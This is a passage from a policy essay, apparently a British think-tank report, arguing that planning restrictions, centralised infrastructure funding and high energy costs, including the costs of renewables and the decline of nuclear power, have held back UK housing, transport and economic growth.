buildings, apparently because they cause overheating in hot weather, and because people might supposedly fall out of them. The same climate has facilitated rules requiring every development to prove ‘nutrient neutrality’, to survey for protected species like newts and bats (even in places where their presence has never been detected), and more. High housing costs also create the demand for destructive policies that appear to alleviate the proximate problems of expensive housing without dealing with the underlying issue. In many cases today, as many of 40 percent of a new development’s homes must be subsidised for ‘affordable’ renters instead of being made available at market rates. These requirements function as a tax on new housing (and so local objectors often support them), redistributing income from every other private tenant to a lucky few. Countries with expensive rental housing also see movements for rent controls, and punitive rental regulations, like giving every tenant the permanent right to live in the property they occupy. The economic effects of housing shortages Since the introduction of the British planning system in 1947, there has been very little increase in housing supply when better jobs make an area more desirable. Instead of extra homes being built, workers competing for scarce housing are forced to bid up the price of existing homes. This means that many of the income gains go to existing landlords and landowners, and that many people cannot move to better jobs at all. Because only the best paid people can afford to move to the most prosperous cities, there is no longer general migration across the economic spectrum, as there was in the nineteenth century when it was the poorest people who were most likely to move to find better work. Today, this has created a situation where only the most gifted and educated people can afford to move to richer cities and stay there. Their less well-off peers are quite literally ‘left behind’, and compete with one another over a narrow pool of jobs, driving the wages down even further, making those places feel even more deprived. On the other hand, social housing anchors many people to extremely central, high-value areas in our major cities. A staggering amount of central London’s housing is socially rented: 40.2 percent of Islington households are on subsidised social rents; as are 33.7 percent of Camden’s; 35.9 percent of those in Tower Hamlets; and 39.7 percent of Southwark’s. These households occupy some of the most valuable space in the country, and are trapped in their tenancies, remaining even when their homes, often damp, poorly insulated, and altogether dilapidated, are no longer fit for their changing circumstances, because they will likely end up in a less valuable, less centrally-located property if they try to move. The result is a ‘missing middle’ in cities like London, where only the very well-off and very badly-off can afford to live there, excluding lower- and middle-income people from elsewhere in the country. Even many higher earners cannot afford to live anywhere near the centre once they have children. The impoverishment of coastal and post-industrial towns cannot be understood without looking at housing shortages in more prosperous parts of the country: both are the products of Britain’s planning system. Since the supply of homes in successful cities is tightly constrained, the growth of our most successful companies and sectors within those cities is constrained as well. Even the people who do get to live in high-productivity places are less productive than they could be, since their employers are less able to hire mid- and lower-skilled people to support them in the workplace. It is inconceivable that Britain could have had the Industrial Revolution if it had banned workers from moving to the coalfields of South Wales and Yorkshire and the textile factories of Lancashire. It is not an exaggeration to say that Britain could be forgoing its role in another industrial revolution today – that of artificial intelligence, biotech, and related technologies – by making the corresponding mistake. A cartogram (from the Office for National Statistics) of the number of jobs around the country. Dark red are highest paid, then light red, then grey, then light blue, then dark blue. The average job in dark red areas pays about double as much as the average job in dark blue areas. Britain is not the only country that has slowed its growth through holding back agglomeration. Parts of America have seen similar shortages. Economists Gilles Duranton and Diego Puga judge that if the whole of New York City allowed the densities that were common in Georgian and Victorian London, rents and house prices would fall towards construction costs, and the metropolitan area would at least double in population, to over 40 million people. Similar things would happen to the Bay Area, Boston, Los Angeles, and other US ‘superstar’ cities if higher densities were allowed. Duranton and Puga argue that huge economic growth would result from allowing these superstar cities to build more. The value of land with and without planning permission. Releasing land for development is much more valuable in some places than in others. From the Resolution Foundation. But things are much worse here in Britain. Overall, American homes only cost around a third more to buy than they do to build.2 About four fifths of American cities saw no gap at all between house prices on the edge of town and the building costs of such homes in the mid-2010s, implying no significant overall regulatory land-use barriers to development in these places.3 The UK has vastly less structure value per capita than European competitors. (Tony Blair Institute.) By contrast, the average UK house price is double the cost of building the house, and the shortage in the South East is so severe that it is spilling over to places as far away as Bristol, Peterborough, and Northampton. Credited to Yimby Alliance/Freddie Poser The fundamental issue is that British cities are not allowed to expand upwards or outwards, whereas most American cities, like those of France, Italy and Germany, have at least been able to sprawl. Under the liberal system of the nineteenth century, late twentieth century Cambridge’s huge success in life sciences would have led to both taller buildings and many new suburbs, connected by new train lines, trams, tubes, and roads. It would likely have a population of at least a million today, just as Glasgow grew from a population of 70,000 in 1800 to over 700,000 in 1900 to facilitate its world-leading shipbuilding industry. Today, nearly all of the potential is blocked. Scarce property means people cannot move to take up the job opportunities on offer. Some businesses never start. Others are not as productive as international competitors. Others fail to scale up to become unicorns or bigger. Cambridge is not alone. Many of our smaller but richer cities and towns, places like Oxford or York, cannot grow up or out. The people who might have lived there, earning £600 or £700 a week, instead live in more deprived areas, earning £400. The same is true of London. It is hard to build new housing or office space, making it hard for businesses to expand, and hard for workers to move to these places to take up good jobs. The postwar housing system has underdelivered since the 1950s: the enormous improvements in housing affordability in the Victorian and Edwardian eras stalled as soon as the new system was introduced. The problem became ever more severe each decade, even before the population began to rise rapidly: average private home sizes actually got smaller during the 1960s and 1970s. But the problem has escalated into a disaster in the last few decades, as massive net immigration, an ageing population, and unforeseen economic change have together led to huge unmet housing demand in the South. The social challenges that accompany high levels of immigration have been hugely amplified by the persistent lack of planning reform. The same failures of the planning system apply to factories, warehouses, offices, labs, data centres, film studios, and retail centres as well. In every area where Britain has a nascent industrial advantage, we do our best to hold it back. Britain’s strongest industries are creative and intangible, and yet we blocked a £750 million film studio by a dual carriageway, right by the UK’s strongest film cluster. Britain is the most advanced country, per capita, in artificial intelligence, but we blocked a £2.5 billion ‘super hub’ data centre site by the M25. Top talent from around the world flocks to work in biotech in Cambridge, yet we have starved the sector of lab space – under one percent of Cambridge lab space is vacant. Prime city centre office space and labs there are renting for even more than residential property. Infrastructure4 From the eighteenth to the early twentieth centuries, Britain had easily the best transport infrastructure in the world. In the eighteenth century, a total of 1,116 private companies built and renewed 22,000 miles of tolled roads, while other companies dug 4,000 miles of canals. The result was by far the best transport system in Europe. In the nineteenth century, Britain built a system of railways that is still impressive today, despite having hardly been added to since 1914 (in fact, we have half as many miles of railway today than we did then). London had an extensive underground railway system in the 1860s, almost four decades before the first underground metro line anywhere else in the world. In fact, the word ‘metro’ for underground railways comes from the Metropolitan Line, the world’s first. In little more than a decade around 1900, private entrepreneurs built five more underground lines totalling hundreds of kilometres, still at no cost to the taxpayer. Ninety British municipalities laid electric tram networks in less than twenty years, including Europe’s longest (in London), while private companies created a gigantic fleet of motor buses. This superb transport system was one of the conditions of Britain’s revolutionary economic expansion, and of London’s position as the foremost city and unquestioned economic capital of the globe. Although Britain’s historic infrastructure was largely delivered by the private sector (and to a lesser extent by local councils), the state did have a role. Delivering national infrastructure is extremely difficult without compulsory purchase powers: if every property owner on the route of a railway can play holdout, it is extremely unlikely to be practicable to buy them all out voluntarily. Until the 1940s, these powers were created through private Acts of Parliament: a select committee considered requests for compulsory purchase powers from the project’s promoters, and if they believed the project was in the national interest, they created an ad hoc law giving the promoters the powers they needed to make it happen. This system was extraordinarily swift and inexpensive: the planning process for major national projects generally took months. By contrast, today’s system is broken. For a whole range of infrastructure – railways, trams, nuclear power, and more – building has become vastly more expensive than competitors across Europe and East Asia. The consenting of major projects usually takes years, and sometimes decades. A suite of reforms in 2008 seems to have produced only moderate improvements, many of which have since been lost. A key national strength has become a key national weakness. Railways On a per-mile basis, Britain now faces some of the highest railway costs in the world. These costs push numerous potential schemes into financial unviability – schemes that would have prospered in the past, and that would prosper in other countries today. High construction costs are effectively precluding a rail transport boom such as Britain enjoyed in the nineteenth century, or France is enjoying today. Even if it had only cost as much as planned in 2013, HS2 would have been between two and four times more expensive than high speed rail lines in Italy and France. In fact it cost a lot more: the section we end up building will be between four and eight times more expensive per mile than French or Italian high speed rail projects. At £18.1 billion for the tunnelled Paddington to Stratford section, the Elizabeth Line (Crossrail) was the second most expensive metro line ever built, at £1.4 billion per mile. By comparison, Madrid built a 120-mile new underground network in twelve years (with much of the network open after just four years) for £68 million per mile – twenty times cheaper than Crossrail and nine times cheaper than the Jubilee line extension built around the same time. Copenhagen built a 9.6 mile underground line in 2019 at a total cost of £3.4 billion or £350 million per mile (four times cheaper). Crossrail 2 (if it is ever built) is expected to cost even more than the Elizabeth Line did per mile. Despite its astonishing construction cost, the Elizabeth Line is so valuable to London that it is probably still good value for money. But if construction costs were more moderate, dozens of other rail schemes would be good value for money too. Britain has also lagged behind on electrification, one of the most important transformations in modern railway technology. Electrified railways are simply better - they allow trains to accelerate faster and reach higher speeds. Electric trains require at least five times less maintenance and suffer fewer breakdowns compared to diesel trains, driving huge gains in reliability. These lower maintenance costs, combined with the fact that expensive diesel isn’t needed to power the trains, means that electrification often saves money in the long run. In the 1890s, electrification rapidly transformed intra-city rail transport. In London alone, the Northern, Piccadilly, Bakerloo, Central and Waterloo & City Lines were opened between 1890 and 1906, transforming urban mobility and galvanising a wave of suburban expansion. But although intercity electrification has been possible for many decades, it has been adopted painfully slowly. Just 38 percent of British railways are electrified, compared to 71 percent of railways in Italy, 61 percent in Germany, and 55 percent in France. India recently electrified hundreds of thousands of kilometres of its network in just ten years – it is now 94 percent electrified. Once more, the key constraint is cost: British per mile electrification costs are more than double those of Germany or Denmark.5 Tramways Trams are potentially a far cheaper way of doing mass transit than underground railways. In the early twentieth century, some two hundred British towns and cities had trams: an immense network that flowered between 1890 and the 1950s, enabling urban expansion, economic growth and higher living standards. Due to their efficiency on heavily travelled routes, many countries are now renewing and reopening tram lines. The outstanding case is France, which has built 21 tramways in recent decades. Britain has begun to make efforts to do the same, but Britain's tram projects are 2.5 times more expensive than French projects per mile, hamstringing the renaissance of the tram in this country. There are now French cities of 150,000 people with fast modern tram systems - towns comparable in size to Carlisle or Lincoln. It is inconceivable that cities of this size could get tramways in England at current build costs. This has led to some profoundly dissatisfying outcomes. Leeds is now the largest city in Europe without a metro system: there are about 830,000 people in the official greater Leeds area, 2.3 million in the broader metropolitan area, and 2.6 million within 50 kilometres, the same as Munich. Munich has an 11.4 kilometre tunnel in the centre of the city allowing it to turn its seven commuter railways into Crossrails, plus eight underground metro lines with around 100 stations, totalling more than 100 kilometres in length. In 1993, the John Major government granted all the necessary powers to build a Leeds ‘Supertram’. But it would have cost £1 billion (£1.6 billion in 2023 prices), on a per-mile basis twice the cost of the average French tramway. This is a key reason why it hasn’t been built in the 31 years since. It’s an especially ironic failure given that a daring private company opened Europe’s first overhead-powered tram network in Leeds in 1891 – a wildly successful project that was subsequently emulated in every major city. Why is infrastructure so expensive in Britain? There are a range of proximate causes for Britain’s high infrastructure costs. Some of them are unalterable: for example, Britain was the first place to install below-street utilities, so we don’t have a very good idea of the pipes hidden under our feet, and tunnelling through soft London clay can perversely be more difficult than through hard Norwegian rock. But many of the key factors have appeared during the last two to three decades, the period during which infrastructure costs have exploded. We gold plate designs, spending extra billions on features that don’t enhance functionality, as with the award-winning Jubilee Line stations, or the plan for HS2 to run 60 kilometres per hour faster than is typical for European high-speed rail. Older infrastructure systems like the Victoria Line, the DLR or the Croydon Tramlink made do with simple repeated station designs, which hugely reduced their cost: the same tends to be true with Continental transport infrastructure today. We waste money on newt and bat surveys and other environmental assessments – like the 18,000 pages, costing £32 million, on reopening just three miles of track for the Bristol-Portishead rail link. The Jubilee Line Extension’s environmental statement in the early 1990s was just 400 pages long. HS2 will be required to dig 105 kilometres of tunnels and cuttings between London and Birmingham to avoid disturbing landscapes, at fantastical expense to the British people. The UK is vulnerable to judicial review – the Aarhus Convention means that campaigners can sue projects and hold them up for years at little cost, even when they know they will lose, at a cost of billions. We have excessive consultations and produce excessive documents, like the 359,000 pages prepared for the Lower Thames Crossing across many rounds of consultation. We often redesign projects multiple times in response to successive waves of ‘stakeholder’ interventions. Successful projects manage this by empowering specialists to make engineering and design decisions on the fly. Unsuccessful projects use generalists or consultants who have to re-approve every small edit they make. Instead of a steady pipeline of projects, we have a ‘feast and famine’ approach. Germany electrifies roughly 200 kilometres of track every year, while Britain oscillates between electrifying 0 and up to 900. This inconsistency prevents businesses from investing in equipment and training construction workers, and stops civil servants developing expertise about efficiently running these projects. All these problems lead to high borrowing costs for the engineering companies contracted to deliver the projects, because of the risks they incur (e.g. two thirds of the cost of Hinkley Point C is financing the project). Analysis of the failures of British infrastructure delivery tends to stop here. But we believe that these proximate causes largely arise from a common source, which is the excessive centralisation of funding and consenting of infrastructure in the national government that has steadily taken place since the 1990s. This has dramatically narrowed the constituency who want infrastructure projects to go ahead while also wanting to minimise their costs. The various ways in which British infrastructure projects have become increasingly slow, contested and expensive are all functions of this underlying mechanism. In the nineteenth and early twentieth centuries, infrastructure was generally funded and delivered privately. The railway system, the canal network, the turnpike roads and the London Underground were all built by private companies. Quasi-private models remained common to the end of the twentieth century, including ‘build, own, operate, transfer’ (the Channel Tunnel) and the private finance initiative (M6 Toll, Tramlink). Other schemes were delivered through arms-length bodies, like London Transport (Victoria Line). Others still were delivered by local governments. Most of Britain’s 300-some tram networks were laid by local authorities, with neither support nor direction from national government. In all of these cases there is a strong constituency who both strongly want the project to go ahead, and also want costs to stay low. Private companies may literally cease to exist if they fail to deliver their product while keeping costs reasonably low, and although local governments will continue to exist in some form, local councillors will be punished severely by the small local electorates who have to pick up the bill generated by their mismanagement. Companies and financially responsible local governments thus have a vivid interest in keeping costs down if they are on the hook for them, and they will lobby zealously against cost bloating. A leading historian of Britain’s tram networks writes of the ‘ardent desire’ of local councils that tram networks turn a profit, which could then be used to subsidise other services or cut local rates. Sure enough, councils vigorously cut costs, dispensing with the expensive underground wire systems that were widely used in Continental cities as a sop to local objectors. This pattern of behaviour continues to hold today in many countries. French cities pay 50 percent towards nearly all mass transit projects that affect them, and sometimes 100 percent (with regional and national government contributing the rest). Unsurprisingly, they then fight energetically to suppress cost bloat, and they generally succeed. The Madrid Metro, one of the world’s finest systems, was funded entirely by the Madrid region. A smaller and poorer municipality than London succeeded in financing 203 kilometres of metro extensions with 132 stations between 1995 and 2011, about 13 times the length of the contemporary Jubilee Line Extension in London. Other countries still operate systems of private infrastructure delivery: Tokyo’s legendary transit network is delivered, and regularly expanded, by private companies who fund development by speculating on land around stations. France’s superb system of motorways is built and maintained by private companies, who manage them with vigour and financial discipline. In Britain, the centralisation of infrastructure delivery in the national government has fundamentally weakened this incentive. No public body will ever have quite the existential interest in cost control that a private one does. But national government also has a weaker interest in it than a financially responsible local government does, because the cost is diffused around a vastly larger electorate. The £300 million spent on the Lower Thames Crossing consenting process is one of the great absurdities of modern British governance, but it still comes to less than £5 per British person. For almost any given infrastructure project, the national Government can waste money buying off militant stakeholder groups, and the immediate cost remains invisibly small to the huge electorate that ultimately bears it. But the aggregate effect of all these small pay-offs is outrageous cost bloat, unaffordable infrastructure, and the relative impoverishment of the country. Consider the Edinburgh Tram. It was built in two phases. The first, completed in 2014, was described as ‘hell on wheels’, by its former chairman, overrunning from a £545 million budget to £776 million. Of the original budget, £500 million came directly from the Scottish government, and £45 million was provided by the council. The second, completed in 2023, was funded by borrowing against future fare revenues. It came in about thirty percent cheaper per mile. Most of the proximate causes listed above are ways in which this underlying pattern manifests itself. Profligate gold-plating, exorbitant community compensation, endless rounds of consultation, elaborate legal obligations, reliance on consultants and so on all naturally arise when none of the parties involved has any serious incentive to oppose them. If Britain wants affordable infrastructure, it needs a system in which those who make the decision to spend money also bear some of the costs of doing so. The most conspicuous result of this cost bloat is of course that the infrastructure projects that do happen tend to be wildly expensive. But perhaps the most important effect is the projects that do not happen at all. The Treasury correctly believes that, under current conditions, public infrastructure projects in Britain will be wastefully mismanaged. Its only way of protecting public finances is thus by blocking these projects altogether. Given the means available to it, this decision is often the correct one. But stepping back, we should recognise that many of the projects blocked by the Treasury could have excellent value for money if only they were delivered at costs that were historically and remain internationally normal. The notorious ‘feast and famine’ procurement pattern of some types of British infrastructure is also thought to be a consequence of this; the Treasury blocks routine schemes, so only schemes with exceptional political or economic support take place, which by nature arise only intermittently and unpredictably. The theory that infrastructure costs are prone to bloating when they are paid for centrally is supported by the example of the one kind of infrastructure that has remained relatively cheap, namely roads. Despite some big failures like the Lower Thames Crossing, Britain ranks mid-table overall, a better performance than for any other infrastructure type. The reason for this is that roads directly benefit a much wider constituency than any given railway project: pretty much anyone in the nearby area rather than just the people within about one kilometre of a given station. What’s more, 94 percent of miles travelled in the UK are on roads (80 percent in private cars, and 14 percent on buses and coaches), so many more people see themselves as having a stake in the issue. The tendency for local obstructionism is thus weaker, and even national government tends not to end up with spiralling costs. For the bulk of the projects, funded (or part-funded) and delivered by local councils themselves, the effect is even stronger. This is why the M25 could be delivered affordably through the traditional planning system, even with a spectacular 39 separate inquiries. In 1987, the first election after the M25 was finished and opened, Margaret Thatcher’s Conservatives won every constituency the road went through, including large swings in historic Labour seats like Thurrock. But this model only works for this kind of locally uncontroversial infrastructure. For the contentious but vital projects that the country needs – railways, viaducts, bridges, nuclear power stations, tramways, wind farms – systemic reform is needed. Why this matters Because of bad delivery mechanisms, British infrastructure is delivered slowly and at great cost. When infrastructure is costly, less of it is delivered. To understand how bad this is, it is worth reviewing why infrastructure is important. Like housing, transport infrastructure is vitally important for growth because it determines who can do which jobs. Reliable, fast transport infrastructure allows people to access a wider range of job options, and businesses to access a wider pool of talent to employ and to transport goods and services more easily. By increasing the speed you can get around, infrastructure expands the effective ‘economic size’ of a city, no less effectively than building more houses does. A ten percent increase in the number of jobs accessible per worker increases productivity 2.4 percent. A 10 percent increase in commuting speed increases the size of the labour market by 15–18 percent. Without the M25 and the suburban railway network, places like Sevenoaks, Luton, Reading, Guildford, Stansted, Chelmsford, and Woking would not be tied economically to the broader London metropolis. Companies in those places would not be able to hire from as big a pool; people living there would not be able to reach the best jobs. It also enables both internal and cross-border trade. The Eurostar helps British services firms sell to Parisian and Brusselian companies. Heathrow is a core reason why international firms have headquarters in London. The strategic road network lets companies and consumers all over the country import and export goods through the country’s seaports. Britain’s transport infrastructure deficit means that it forgoes these benefits. We can’t build new tramways or a metro cheaply in Birmingham, so the city is riddled with road congestion, and people choose lower-paying jobs with worse working conditions because they are easier to get to rather than because they are the best for their careers. Without the Lower Thames Crossing, road haulage to and from the Ports of Dover and Felixstowe has to move over the congested and further-flung Dartford Crossing, slowing down and raising costs for British firms looking to trade internationally. Commuting flows in England and Wales. High quality infrastructure is the reason why so many can commute miles to bigger job markets than where they live. A second and vitally important benefit from all infrastructure is that, without it, locals oppose new homes near them. If there is already congestion on the roads they use, or they are already unable to get a seat on their morning train, they have a powerful reason to oppose new development. Thus, new infrastructure enables new homes and makes them politically much easier to build. The infrastructure deficit makes them correspondingly harder. In some cases, the infrastructure deficit is literally making new development in Britain unlawful. Because Britain has not built a new reservoir for thirty years, there are chronic water shortages in the East of England. This means that the Environment Agency has begun to block new housing on the basis that it could only be supplied with water through drawing on environmentally valuable chalk streams. The result is that it is virtually unlawful for the Government to permit the expansion of Cambridge, leading to the gradual strangulation of Britain’s biotech industry. The same problem will compromise any new town scheme that the Government wants to initiate in large parts of the country. This chapter has focussed on the deficit in transport infrastructure. But there is another infrastructure deficit that is at least as grave: energy. Energy costs are rising steeply in Britain, starving energy-intensive industries and undermining living standards. This disastrous trend has deep causes, to which we turn in the next chapter. Britain: the first energy superpower6 Between 1550 and 1700, Britain transformed from a normal European country, depending on peat and wood for heating homes, to by far Europe’s biggest coal producer and consumer. Every coal-producing region upped its output by at least ten times. By 1640, Britain was mining around 1.5 million tonnes of coal per year, about three times as much as the rest of Europe put together. This energy boom set off growth in an uncountable number of other industries. The Firth of Forth started exporting salt all over Europe, including to salt-producing regions like the Low Countries. Britain’s coal allowed it to become a major producer of soap, candles, starch, saltpetre (for gunpowder), alum and copperas (for fixing dyes into clothes), as well as being used in brewing, dyeing, making malt, baking bread, making tiles and bricks, forging and working iron, copper, brass, lead, silver, and tin, glass, and bending staves and beams for barrels and ships. It went much further than these cases. Coal is used to produce lime. Cheaper and more abundant coal meant dramatically more lime. Dramatically more lime meant dramatically more fertiliser, which meant much more productive grain fields. More salt meant more meat and fish preservation, raising the productivity of pasture land. Peatlands and heaths were no longer necessary for fuel, so they could be converted to arable land or pastures. All of this meant more muscle power – horses and oxen – which powered the earliest machinery. These animals were put to an enormous range of uses, and their extreme proliferation in Britain wowed Europeans throughout the 1600s and 1700s. And it meant more human muscle power. The average Briton ate something like 600 calories more per day than the average Frenchman, and was about five centimetres taller. All this is to say that Britain was the first energy superpower, and it built its global economic dominance on the back of, above all, cheaper and more abundant energy than anywhere else. Until the 1920s it produced more energy per person than any other country. Until the 1960s it produced more energy than any other country but America. As coal’s enormous downsides were recognised – horrific lung issues for those mining it and inhaling its fumes, as well as devastating smogs – in 1956 we became the first of all countries to move to the energy technology of the future: nuclear. In its early years, Britain was the world leader in nuclear power. In 1965 we had 21 nuclear reactors, compared to 19 in the rest of the world combined. Uranium’s energy density – three million times higher than coal – suggested that it could be much cheaper as a source of power, since it would not necessitate so much mining and transportation. We didn’t realise then that nuclear power could also help us to avoid damaging climate change. But had we continued down that path, we would have inadvertently decarbonised, like France. If we had only kept pace with the rate of nuclear rollout that we had between 1956 and 1998, by extending the lifetimes of our older plants and adding new ones, today we would be producing around 150 TWh of nuclear power per year, or around 50 percent of our total current electricity generation. But we did not. Nuclear power in Britain is now half of what it was at its peak, and energy costs today are higher than they have been for a century. Energy costs There are good reasons to want the UK to have a large, productive industrial base. But any industrial strategy aimed at doing this must first reckon with the enormous rises in energy prices for UK businesses since the mid-2000s. The industrial price of electricity rose by 153 percent between 2004 and 2021, adjusted for inflation. It rose even more brutally again after the Russian invasion of Ukraine. Very large industrial customers (those consuming 70,000–150,000 megawatt-hours of electricity every six months) paid more than twice as much in Britain (13.79p per kilowatt-hour) for electricity in 2021 as their counterparts in France did (6.62p per kilowatt-hour), and, again, the gap has grown since Russia’s invasion of Ukraine. Even if energy costs eventually fall back to normal pre-war levels, those are still much more expensive in real terms than twenty years ago. Fixing this has to be step one for any serious industrial strategy. High energy costs are a problem across the developed world. Energy consumption per capita in even the relatively fast-growing United States has flatlined from the early 1970s oil crisis onwards. But things are much worse here. The UK’s energy use per person has long been far behind that of the United States, but it fell behind both France and Germany in the post-war era. Despite moderate improvements under Thatcher, it has slid since the mid-2000s to fall further below other countries. Britain’s energy use per unit of GDP is now the lowest in the G7, and is lower than nearly every region and every non-tax-haven in both Europe and the OECD. By many measures, Britain is the most energy-starved nation in the developed world. The problem of high energy costs for manufacturing was raised by Mario Draghi’s recent report on EU competitiveness, which highlighted the strong correlation between an industry’s energy intensiveness and its decline since the outbreak of the Ukraine war. Draghi also warned that the EU’s traditional manufacturing strengths, such as automobiles, were at risk of being outcompeted by other countries with cheaper energy. Yet British firms pay on average 60 percent more for electricity than French ones (the gap is larger for larger customers, as mentioned above). The total amount of energy used by the steel industry has fallen by about three quarters in the last two decades. UK Steel says that ‘long-standing uncompetitive electricity prices have constrained UK investment and steel production for some time’, and in 2022 when Russia’s invasion of Ukraine drove energy prices to their highest-ever levels, some steel plants paused production at times of the day when prices were spiking. And steel is only one example: CF Fertilisers recently closed its ammonia plant in Billingham permanently, because of Britain’s high energy costs. Even writing off industrial production altogether would not make this problem go away. Data centres, the infrastructure backbone of the internet, have become even more essential as artificial intelligence has risen, since they are required for both the training and use of AI models. And they require enormous amounts of electricity. A large data centre can require over 100 megawatts of power, more than 300,000 homes. Electricity is so essential to data centres’ output that their scale is typically measured in terms of their electricity needs instead of their square footage. Last year they accounted for 21 percent of Ireland’s total electricity use. At a minimum, this will be important for Britain. In some scenarios for the near future, virtually nothing matters more than Britain building many large, efficient, well-powered data centres. Unfortunately, most prominent examples of industrial strategy ignore that high energy costs are by far the biggest problem facing British industry today. Subsidies for British industry, like the recent commitment to give Tata £500 million to invest in steelmaking here, are an expensive sticking plaster on this much bigger wound. Just over three quarters of the energy we use still comes from gas and oil, directly heating our houses and powering our cars. Gas is also widely used for industrial heat generation. But we are attempting to electrify our economy, which means replacing gas boilers with heat pumps, and petrol cars with electric ones. Shifting to electric road vehicles will create 40 percent more total electricity demand. Data centres are entirely reliant on electricity. Rising temperatures from climate change will necessitate more use of air conditioning that runs on electricity. So it is especially worrying that we are so far behind peer economies on electricity generation, and have been generating less and less electricity since the start of the century. If energy stagnation is, as some economists and engineers have suggested, a cause of the West’s slowdown over the past fifty years, then it should be no surprise that Britain’s economy has fared as badly as it has. Along with inadequate housing and transport, this is one of the most fundamental weaknesses of the contemporary British economy. Any attempt to change course has to accept the central importance of cheap, abundant energy to prosperity. Intermittent renewables and energy prices Climate change is a serious challenge. Britain has committed, with the rest of the developed world, to bringing its carbon emissions down significantly over the next three decades. Greenhouse gas emitters do not bear the true costs they impose on the world. A (border-adjusted) carbon tax that made them pay the social cost of the emissions they created would make the true costs of their emissions clear, and would make cleaner forms of energy significantly more cost-competitive, and possibly outright cheaper. It would also provide an ‘automatic’ impetus to develop and adopt technologies like carbon capture and carbon removal. But carbon taxes have often failed politically where they have been tried, pushing politicians towards subsidies, price guarantees and other incentives to move to clean energy sources instead. Though this approach still tilts the balance toward cleaner technologies, its true costs are hidden. And because this approach necessitates the government picking winners, it may mean paths to decarbonisation that are much more costly than others. Intermittent renewables, which are primarily wind and solar power in the British market, are sources that, though clean, cannot produce a constant supply of electricity, and cannot be turned on at will. This means that the marginal price of electricity as traded between generators and energy suppliers is largely set by the marginal cost of booting up power plants that can produce enough to meet demand at any given time. Usually those plants run on natural gas. This means that short-term wholesale electricity prices tend to be set by gas prices. The price of electricity as actually paid by consumers, however, differs from the wholesale cost of electricity as traded between generators and suppliers. This wholesale cost is only about 30-40 percent of the total bill that a consumer pays. Electricity consumers, which include both industrial consumers and households, need to pay for the costs of the entire electricity system, not just generation: the transmission and distribution networks, the growing costs of balancing the grid, plus a margin for suppliers, plus the policy costs of whatever subsidies to electricity generators the government has seen fit to pay, plus the costs of contracts for rarely-used but essential emergency backup generation. There is no necessary reason why these costs need to fall on energy consumers: some could equally well be paid from general taxation. But either way the costs must be paid. Therefore, from the perspective of a consumer, what matters is not the price of electricity from a given wind farm as traded on the wholesale market, but the total cost of the entire electricity supply system. It is commonplace to claim that electricity generated from wind or solar power is cheaper than electricity from traditional power plants. Yet the more wind and solar we hook up to the grid, and the more fossil fuel power plants we retire, the higher bills seem to go. In fact, intermittent renewable energy is nowhere near commercially competitive. According to the Office for Budget Responsibility and Ofgem, the direct costs of subsidies of renewable power generation now exceed £10 billion a year, across the Renewables Obligation, Contracts for Difference, and Feed-in-Tariff schemes, which provide a guaranteed price for electricity generated by renewables over, normally, a fifteen-year time horizon. The September 2024 auction for Contracts for Difference, which covered new supply equivalent to eight percent of the UK’s current electricity generation, concluded with the state guaranteeing an inflation-indexed price 30 percent higher than current wholesale market prices to a range of renewable energy suppliers for the next 15 years. These costs are passed on to energy customers through higher prices. But as well as the direct subsidy needed to make intermittent sources of electricity profitable, these renewables increase other system-level costs that are paid by consumers. There are three main sources of this: More need for transmission lines to connect generation to households and industry. Traditionally, power plants were located fairly close to major population centres. The highest wind speeds, however, are available offshore and in northern Scotland. Add in the impact of the planning system pushing wind farms to locate in more remote places, and the result is that the annual costs of transmission maintenance and installation have risen from £1.35 billion in 2008/9 to over £4 billion in 2024/25. The UK’s electricity system operator plans for £54 billion of total transmission spending between now and 2030, citing the need to accommodate a large increase in offshore wind generation during this period. Increased grid balancing costs. Electricity supply must be matched to demand on a second-by-second basis. As increasing fractions of the generation mix become weather-dependent and hence to a degree uncontrollable and unpredictable, the grid operator needs to spend more money both on paying generators to switch off when supply exceeds demand, but also for emergency backup generation to come online when wind speeds drop. These balancing costs are estimated at £2.4 billion for 2023/24, and are estimated by the Electricity System Operator to rise to over £4 billion a year by the end of the decade. The costs of paying for backup capacity. This is especially important for periods of multi-week lulls in wind speeds, which can occur during periods with overcast weather that curtail solar generation as well. These periods require a fleet of dispatchable plants with total capacity approximately equal to peak demand, powered either by gas or, in some envisioned Net Zero scenarios, hydrogen stored for years in underground salt caverns. Batteries may become viable for energy storage across a day or a few days, but seem unlikely to be able to provide for weeks-long lulls in wind and sunlight. Currently the UK has 4.6 gigawatt-hours of battery storage capacity, or about 0.3 percent of daily energy demand. Since these plants will, in optimistic Net Zero scenarios, operate relatively rarely and so be unable to sufficiently recoup their costs through electricity sales alone, they will likely require ongoing subsidy. So far we have committed over £3.6 billion to pay for backup energy supply in 2027/8, based on recent auction results, and it is unclear if even this expenditure is sufficient to ensure security of supply given the planned partial reliance on electricity imports from Europe. Once these system-level costs are accounted for, building a grid around wind and solar power is much more expensive than implied by the Levelized Cost of Energy (or LCOE) estimates typically cited by government departments or the press, and – along with the decommissioning of coal and gas-fired power plants since the 2000s – explains why Britain’s electricity costs have risen so much compared to other countries’. None of this section is to say that intermittent renewables are bad or pointless. Reducing carbon emissions is essential, and the true cost of fossil fuels is higher than it appears because of the carbon emissions they create. We can improve efficiency by allowing electricity prices to reflect the actual cost of supplying electricity to a given premises (what is known as locational pricing) and the real-time value of the electricity (time-of-use pricing). In many parts of the world the problems these power sources face are much less significant: for example, where there is more constant sunshine across the year, solar is much less intermittent. It may turn out that building interconnectors between Britain and continental Europe and Africa means we can import solar electricity from these sunnier latitudes. A proposed interconnector between Portsmouth and France would add 2,000 megawatts, or 16 terawatt hours a year, to Britain’s electricity supply: enough to power twenty large data centres, four million new homes, or one-seventh of our road transport needs if we switched entirely to electric vehicles. However, this project and others like it may be rejected by Ofgem, the energy regulator. Or we may make technological breakthroughs, for example in ultra-dense battery storage, or in atmospheric carbon capture, that make some of our current problems irrelevant. But, for now, the current consensus in favour of large, increasing subsidies for intermittent renewables in Britain is a consensus in favour of high and rising energy costs. In order to prosper again, Britain needs abundant and reliable clean energy. Intermittent renewables may be able to give us this someday, but they cannot provide it yet. Thankfully, there is a technology that can: nuclear power. Nuclear power Nuclear power avoids the biggest problem that solar and wind power face: it produces constant amounts of electricity across the day and year. This means we can depend on it. Its operation produces essentially zero carbon dioxide. It already provides two thirds of France’s electricity. And it is safer than almost any other source of electricity, even wind power. Britain, once a world leader in atomic power, hasn't built a new nuclear power station in the last 28 years, during which period it has shuttered eight reactors – and eight more are set for the chop. Nuclear power accounts for only 12.5 percent of our annual electricity output. The cost of building new reactors has become eye-wateringly high. Our nuclear power construction costs are the second highest in the world, but this is not inevitable or inherent in the technology: nuclear power was once cost-competitive with coal. Unlike with 